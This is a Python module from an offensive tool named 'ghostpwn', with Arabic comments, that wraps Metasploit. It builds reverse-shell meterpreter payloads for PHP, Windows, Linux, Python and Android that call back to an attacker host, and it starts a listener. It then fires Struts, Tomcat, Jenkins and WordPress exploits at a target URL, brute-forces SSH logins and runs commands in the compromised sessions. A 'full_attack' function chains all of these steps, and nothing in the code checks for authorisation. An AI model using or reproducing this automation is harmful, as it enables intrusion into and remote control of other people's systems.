#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Metasploit Integration
تكامل Metasploit Framework في الأداة

الاستخدام:
  python3 -m modules.metasploit_integration --action scan --rhost 10.0.0.1
  python3 -m modules.metasploit_integration --action exploit --url http://target.com
"""
import os
import sys
import re
import time
import subprocess
import json
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.payload_generator import generate_reverse_shell


class MetasploitIntegration:
    """تكامل Metasploit Framework"""

    def __init__(self, audit_logger=None, timeout: int = 600):
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.timeout = timeout
        self.msfconsole_path = self._find_msfconsole()
        self.msvenom_path = self._find_msvenom()
        self.results = {
            "sessions": [],
            "exploits_run": [],
            "payloads_generated": [],
            "auxiliary_run": [],
        }

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[METASPLOIT] {msg}", level)

    def _find_msfconsole(self) -> str:
        """البحث عن msfconsole"""
        paths = ["msfconsole", "/usr/bin/msfconsole", "/opt/metasploit-framework/msfconsole"]
        for path in paths:
            try:
                result = subprocess.run(
                    [path, "--version"] if "/" not in path else ["test", "-f", path],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 or os.path.isfile(path):
                    return path
            except Exception:
                pass
        return None

    def _find_msvenom(self) -> str:
        """البحث عن msfvenom"""
        paths = ["msfvenom", "/usr/bin/msfvenom", "/opt/metasploit-framework/msfvenom"]
        for path in paths:
            try:
                result = subprocess.run(
                    [path, "--help"] if "/" not in path else ["test", "-f", path],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0 or os.path.isfile(path):
                    return path
            except Exception:
                pass
        return None

    def is_available(self) -> bool:
        """فحص توفر Metasploit"""
        return self.msfconsole_path is not None

    def _run_msf_command(self, commands: List[str], timeout: int = None) -> Tuple[str, str, int]:
        """تنفيذ أوامر msfconsole"""
        if not self.is_available():
            self._log("Metasploit غير متاح - ثبّته: apt install metasploit-framework", "error")
            return "", "msfconsole not found", 1

        # بناء command string
        cmd_str = " ; ".join(commands) + " ; exit"

        try:
            result = subprocess.run(
                [self.msfconsole_path, "-q", "-x", cmd_str],
                capture_output=True,
                text=True,
                timeout=timeout or self.timeout,
                env={**os.environ, "BUNDLE_GEMFILE": "/usr/share/metasploit-framework/Gemfile"}
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            self._log("msfconsole انتهى وقته", "warn")
            return "", "Timeout", 124
        except Exception as e:
            self._log(f"خطأ msfconsole: {e}", "error")
            return "", str(e), 1

    # ============================ Payload Generation ============================

    def generate_payload(self, payload_type: str, lhost: str, lport: int,
                         format: str = "raw", output_file: str = None) -> Optional[str]:
        """توليد payload عبر msfvenom"""
        if not self.msvenom_path:
            self._log("msfvenom غير متاح", "error")
            return None

        payloads = {
            "php": "php/meterpreter/reverse_tcp",
            "java": "java/jsp_shell_reverse_tcp",
            "linux_elf": "linux/x86/meterpreter/reverse_tcp",
            "windows_exe": "windows/meterpreter/reverse_tcp",
            "python": "python/meterpreter/reverse_tcp",
            "cmd_windows": "cmd/windows/reverse_powershell",
            "android": "android/meterpreter/reverse_tcp",
            "web_delivery": "php/meterpreter/reverse_tcp",
        }

        payload_name = payloads.get(payload_type)
        if not payload_name:
            self._log(f"نوع payload غير معروف: {payload_type}", "error")
            return None

        if not output_file:
            output_file = f"/tmp/ghostpwn_payload_{payload_type}_{int(time.time())}"

        cmd = [
            self.msvenom_path,
            "-p", payload_name,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format,
            "-o", output_file,
        ]

        self._log(f"توليد payload: {payload_name} (LHOST={lhost}, LPORT={lport})", "info")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                self._log(f"تم توليد payload: {output_file}", "success")
                self.results["payloads_generated"].append({
                    "type": payload_type,
                    "payload": payload_name,
                    "file": output_file,
                    "lhost": lhost,
                    "lport": lport,
                })
                return output_file
            else:
                self._log(f"فشل توليد payload: {result.stderr}", "error")
                return None
        except Exception as e:
            self._log(f"خطأ: {e}", "error")
            return None

    def generate_php_meterpreter(self, lhost: str, lport: int) -> Optional[str]:
        """توليد PHP meterpreter"""
        return self.generate_payload("php", lhost, lport, format="raw", 
                                      output_file=f"/tmp/ghost_meterpreter.php")

    def generate_windows_exe(self, lhost: str, lport: int) -> Optional[str]:
        """توليد Windows EXE"""
        return self.generate_payload("windows_exe", lhost, lport, format="exe",
                                      output_file=f"/tmp/ghost_meterpreter.exe")

    def generate_linux_elf(self, lhost: str, lport: int) -> Optional[str]:
        """توليد Linux ELF"""
        return self.generate_payload("linux_elf", lhost, lport, format="elf",
                                      output_file=f"/tmp/ghost_meterpreter.elf")

    def generate_python_meterpreter(self, lhost: str, lport: int) -> Optional[str]:
        """توليد Python meterpreter"""
        return self.generate_payload("python", lhost, lport, format="raw",
                                      output_file=f"/tmp/ghost_meterpreter.py")

    # ============================ Handler Setup ============================

    def start_handler(self, lhost: str, lport: int,
                      payload: str = "php/meterpreter/reverse_tcp") -> bool:
        """بدء multi/handler في الخلفية"""
        self._log(f"بدء handler على {lhost}:{lport} ({payload})", "phase")

        commands = [
            f"use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "exploit -j",
        ]

        stdout, stderr, rc = self._run_msf_command(commands, timeout=30)

        if "Started reverse TCP handler" in stdout or "Waiting for incoming" in stdout:
            self._log("Handler يعمل!", "success")
            return True
        else:
            self._log("فشل بدء handler", "warn")
            return False

    # ============================ Exploits ============================

    def exploit_web_app(self, url: str, lhost: str, lport: int) -> Dict:
        """استغلال تطبيق ويب"""
        self._log(f"محاولة استغلال: {url}", "phase")

        result = {
            "url": url,
            "exploits_tried": [],
            "sessions_gained": 0,
        }

        # قائمة exploits للمحاولة حسب التكنولوجيا المكتشفة
        exploits_to_try = [
            {
                "module": "exploit/multi/http/struts2_rest_mapper",
                "name": "Apache Struts 2 REST Plugin",
                "conditions": ["struts"],
            },
            {
                "module": "exploit/multi/http/struts2_code_exec_classloader",
                "name": "Apache Struts 2 ClassLoader",
                "conditions": ["struts"],
            },
            {
                "module": "exploit/multi/http/tomcat_mgr_deploy",
                "name": "Tomcat Manager Deploy",
                "conditions": ["tomcat"],
            },
            {
                "module": "exploit/multi/http/jenkins_script_console",
                "name": "Jenkins Script Console",
                "conditions": ["jenkins"],
            },
            {
                "module": "exploit/unix/webapp/wp_admin_shell_upload",
                "name": "WordPress Admin Shell Upload",
                "conditions": ["wordpress"],
            },
            {
                "module": "exploit/multi/http/manage_engine_dc_pmp_sqli",
                "name": "ManageEngine SQLi",
                "conditions": ["manageengine"],
            },
            {
                "module": "exploit/multi/http/php_cgi_arg_injection",
                "name": "PHP CGI Argument Injection",
                "conditions": ["php"],
            },
        ]

        # محاولة كل exploit
        for exploit in exploits_to_try[:3]:  # أول 3 بس للتوفير في الوقت
            self._log(f"محاولة: {exploit['name']}", "info")

            commands = [
                f"use {exploit['module']}",
                f"set RHOSTS {url.split('://')[1].split('/')[0] if '://' in url else url}",
                f"set TARGETURI /",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "exploit -z",
            ]

            stdout, _, _ = self._run_msf_command(commands, timeout=60)

            # فحص لو حصلنا على session
            if "Meterpreter session" in stdout or "Command shell session" in stdout:
                self._log(f"تم الحصول على session عبر {exploit['name']}!", "success")
                result["sessions_gained"] += 1
                result["exploits_tried"].append({
                    "module": exploit["module"],
                    "name": exploit["name"],
                    "success": True,
                })
                self.results["sessions"].append({
                    "exploit": exploit["module"],
                    "url": url,
                })
                break
            else:
                result["exploits_tried"].append({
                    "module": exploit["module"],
                    "name": exploit["name"],
                    "success": False,
                })

        return result

    # ============================ Auxiliary Modules ============================

    def run_auxiliary(self, module: str, options: Dict) -> Dict:
        """تشغيل auxiliary module"""
        self._log(f"تشغيل auxiliary: {module}", "info")

        commands = [f"use {module}"]
        for key, value in options.items():
            commands.append(f"set {key} {value}")
        commands.append("run")

        stdout, _, _ = self._run_msf_command(commands, timeout=120)

        self.results["auxiliary_run"].append({
            "module": module,
            "options": options,
            "output": stdout[:2000],
        })

        return {"output": stdout[:2000]}

    def port_scan(self, rhost: str, ports: str = "1-1000") -> Dict:
        """فحص بورتات عبر Metasploit"""
        return self.run_auxiliary("auxiliary/scanner/portscan/tcp", {
            "RHOSTS": rhost,
            "PORTS": ports,
            "THREADS": "50",
        })

    def http_version(self, rhost: str, rport: int = 80) -> Dict:
        """كشف إصدار HTTP server"""
        return self.run_auxiliary("auxiliary/scanner/http/http_version", {
            "RHOSTS": rhost,
            "RPORT": str(rport),
        })

    def http_dirs(self, rhost: str, rport: int = 80) -> Dict:
        """فحص directories عبر Metasploit"""
        return self.run_auxiliary("auxiliary/scanner/http/brute_dirs", {
            "RHOSTS": rhost,
            "RPORT": str(rport),
        })

    def smb_version(self, rhost: str) -> Dict:
        """كشف إصدار SMB"""
        return self.run_auxiliary("auxiliary/scanner/smb/smb_version", {
            "RHOSTS": rhost,
        })

    def ssh_login(self, rhost: str, username: str, password: str,
                  rport: int = 22) -> bool:
        """محاولة SSH login"""
        result = self.run_auxiliary("auxiliary/scanner/ssh/ssh_login", {
            "RHOSTS": rhost,
            "RPORT": str(rport),
            "USERNAME": username,
            "PASSWORD": password,
            "STOP_ON_SUCCESS": "true",
        })

        if "Success" in result.get("output", "") or "Session" in result.get("output", ""):
            self._log(f"SSH login ناجح: {username}:{password}", "success")
            return True
        return False

    # ============================ Session Management ============================

    def list_sessions(self) -> List[str]:
        """عرض الـ sessions"""
        stdout, _, _ = self._run_msf_command(["sessions -l"], timeout=15)

        sessions = []
        for line in stdout.split("\n"):
            if "session" in line.lower() and ":" in line:
                sessions.append(line.strip())

        return sessions

    def run_session_command(self, session_id: int, command: str) -> str:
        """تنفيذ أمر في session"""
        commands = [
            f"sessions -i {session_id}",
            command,
            "background",
        ]
        stdout, _, _ = self._run_msf_command(commands, timeout=30)
        return stdout

    def get_system_info(self, session_id: int) -> Dict:
        """معلومات النظام من session"""
        info = {}

        # sysinfo
        output = self.run_session_command(session_id, "sysinfo")
        for line in output.split("\n"):
            if ":" in line:
                key, value = line.split(":", 1)
                info[key.strip()] = value.strip()

        # getuid
        output = self.run_session_command(session_id, "getuid")
        if "Server username" in output:
            info["username"] = output.split("Server username:")[-1].strip()

        return info

    # ============================ Full Attack ============================

    def full_attack(self, url: str, lhost: str, lport: int = 4444) -> Dict:
        """هجوم كامل عبر Metasploit"""
        self._log("بدء الهجوم الكامل عبر Metasploit...", "phase")

        result = {
            "url": url,
            "lhost": lhost,
            "lport": lport,
            "sessions_gained": 0,
            "exploits_tried": [],
        }

        # 1) بدء handler
        self.start_handler(lhost, lport)

        # 2) محاولة exploits
        exploit_result = self.exploit_web_app(url, lhost, lport)
        result["exploits_tried"] = exploit_result["exploits_tried"]
        result["sessions_gained"] = exploit_result["sessions_gained"]

        # 3) فحص الـ sessions
        sessions = self.list_sessions()
        if sessions:
            self._log(f"تم الحصول على {len(sessions)} session!", "success")
            result["sessions"] = sessions

        return result

    def print_results(self):
        """عرض النتائج"""
        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  ⚔️  Metasploit Results{Colors.NC}")
        print(f"{Colors.MAGENTA}{'═'*60}{Colors.NC}")

        r = self.results

        if r["payloads_generated"]:
            print(f"\n  {Colors.BOLD}Payloads Generated:{Colors.NC}")
            for p in r["payloads_generated"]:
                print(f"    {Colors.GREEN}✓{Colors.NC} {p['type']}: {p['file']}")

        if r["exploits_run"]:
            print(f"\n  {Colors.BOLD}Exploits Run:{Colors.NC}")
            for e in r["exploits_run"]:
                status = f"{Colors.GREEN}✓{Colors.NC}" if e.get("success") else f"{Colors.RED}✗{Colors.NC}"
                print(f"    {status} {e['name']}")

        if r["sessions"]:
            print(f"\n  {Colors.RED + Colors.BOLD}Sessions Gained:{Colors.NC}")
            for s in r["sessions"]:
                print(f"    {Colors.GREEN}✓{Colors.NC} {s}")

        if r["auxiliary_run"]:
            print(f"\n  {Colors.BOLD}Auxiliary Modules:{Colors.NC}")
            for a in r["auxiliary_run"]:
                print(f"    - {a['module']}")

        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Metasploit Integration")
    parser.add_argument("--action", choices=["generate", "handler", "exploit", "scan", "full"],
                       required=True)
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--rhost", help="Remote host")
    parser.add_argument("--lhost", required=True, help="Listener host (your IP)")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--payload-type", default="php", help="Payload type")
    parser.add_argument("--format", default="raw", help="Output format")
    args = parser.parse_args()

    msf = MetasploitIntegration()

    if not msf.is_available():
        print(f"\n{Colors.RED}[!] Metasploit غير متاح{Colors.NC}")
        print(f"    ثبّته: apt install metasploit-framework")
        sys.exit(1)

    if args.action == "generate":
        msf.generate_payload(args.payload_type, args.lhost, args.lport, args.format)
    elif args.action == "handler":
        msf.start_handler(args.lhost, args.lport)
    elif args.action == "exploit":
        if args.url:
            msf.exploit_web_app(args.url, args.lhost, args.lport)
    elif args.action == "scan":
        if args.rhost:
            msf.port_scan(args.rhost)
    elif args.action == "full":
        if args.url:
            msf.full_attack(args.url, args.lhost, args.lport)

    msf.print_results()
